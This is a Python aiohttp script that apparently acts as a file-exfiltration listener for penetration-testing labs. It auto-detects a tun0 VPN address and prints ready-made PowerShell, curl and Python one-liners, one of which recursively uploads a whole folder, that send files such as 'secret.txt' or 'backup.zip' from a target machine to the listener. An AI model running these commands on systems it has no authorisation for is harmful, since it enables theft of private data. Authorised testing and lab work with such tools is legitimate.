from aiohttp import ClientSession, web, CookieJar, client_exceptions
import asyncio
import argparse
import ssl
import os 
from urllib.parse import quote_plus
import netifaces as ni
import uuid
from pathlib import Path
import re

parser = argparse.ArgumentParser(description='Receive POST data')
parser.add_argument("--port", "-p",  type=int, default=8080)
parser.add_argument("--ip",  type=str, default="0.0.0.0")
parser.add_argument("--tls",  action='store_true')
parser.add_argument("--cert",  type=str, default="server.crt")
parser.add_argument("--key",  type=str, default="server.key")
parser.add_argument("--dir",  type=str, default="/tmp/")
args = parser.parse_args()

showip = args.ip
if showip == "0.0.0.0":
  if "tun0" in ni.interfaces():
    showip = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr']
  else:
    showip = "SERVERIP"

proto="http"
if args.tls:
  proto="https"


examples = f"""
\033[1;32m ==> Windows client example \033[0m
powershell -c "(New-Object System.Net.WebClient).UploadFile('{proto}://{showip}:{args.port}/','C:\\Users\\BOB\\Pictures\\xyz.jpg')"
curl.exe -kF "file=@C:\\Users\\john\\Downloads\\backup.zip" "{proto}://{showip}:{args.port}"
"""
examples += f"$path='myfolder';$url='{proto}://{showip}:{args.port}/'"+';$wc=New-Object System.Net.WebClient;Get-ChildItem $path -File -Recurse -ErrorAction SilentlyContinue -Force |%{$wc.UploadFile($url+$($_|Resolve-Path -Relative|Split-Path),$_.Fullname)}'

examples += f"""

\033[1;32m ==> Linux client example \033[0m
curl -kF "file=@/home/user/secret.txt" "{proto}://{showip}:{args.port}"
"""
examples+="python3 -c 'import requests;f = {\"file\": open(\"/tmp/secret.txt\", \"rb\")};r = requests.post(\""+f"{proto}://{showip}:{args.port}"+"\", files=f, verify=False)'\n"

listening = examples + f"\n\033[1;32m ==> Listening {args.ip}:{args.port} \033[0m"

async def PostHandler(req):
  # Handle post messages
  if req.content_type not in ["multipart/form-data"]:
    data = await req.post()
    print(f"\n\033[1;32m ==> Post data from {req.remote} \033[0m")
    for k,v in data.items():
      if len(v) > 0:
        print(f"{k}={v}")
      else:
        print(f"{k}\n")
    return web.Response(text=f"Ok\n")

  # Handle files
  reader = await req.multipart()
  field = await reader.next()
  filename = field.filename
  if filename is None:
    filename = "NONAME_"+uuid.uuid4().hex
  print(f"\n\033[1;32m ==> Retrieving file from {req.remote} : {filename} \033[0m")
  size=0
  filename = quote_plus(filename)

  # Output folder
  folderbase = f"{args.dir}/{req.remote}"
  if args.dir == "":
    folderbase = f"/tmp/{req.remote}"
  folderbase = str(Path(folderbase).resolve().absolute())
  folder = folderbase
  for i in re.split(r'\\|/',req.path.strip('/').strip(r'\\')):
    folder += "/" + quote_plus(i)
  folder = str(Path(folder).resolve().absolute())
  if not folder.startswith(folderbase):
    folder = folderbase
  if not os.path.exists(folder):
    os.makedirs(folder)

  with open(os.path.join(folder, filename), 'wb') as f:
    while True:
      chunk = await field.read_chunk(size=8192)  # 8192 bytes by default.
      if not chunk:
        break
      size += len(chunk)
      f.write(chunk)
  print(f"Saved: {folder}/{filename} (size:{size} bytes)")
  
  return web.Response(text=f"Uploaded {size} bytes\n")

async def WebServer():
  app = web.Application(client_max_size=1024**2*99999)
  app.add_routes([
    # web.get('/{tail:.*}', GetHandler),
    web.post('/{tail:.*}', PostHandler),
  ])

  runner = web.AppRunner(app)
  await runner.setup()

  if args.tls:
    ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    ssl_context.load_cert_chain(args.cert, args.key)
  else:
    ssl_context = None

  site = web.TCPSite(runner, args.ip, args.port, ssl_context=ssl_context)
  await site.start()

  print(listening)

  return runner

async def Main():
  webserver = await WebServer()
  while True:
      try: await asyncio.sleep(1)
      except: break
  await webserver.cleanup() 

def main():
    asyncio.run(Main())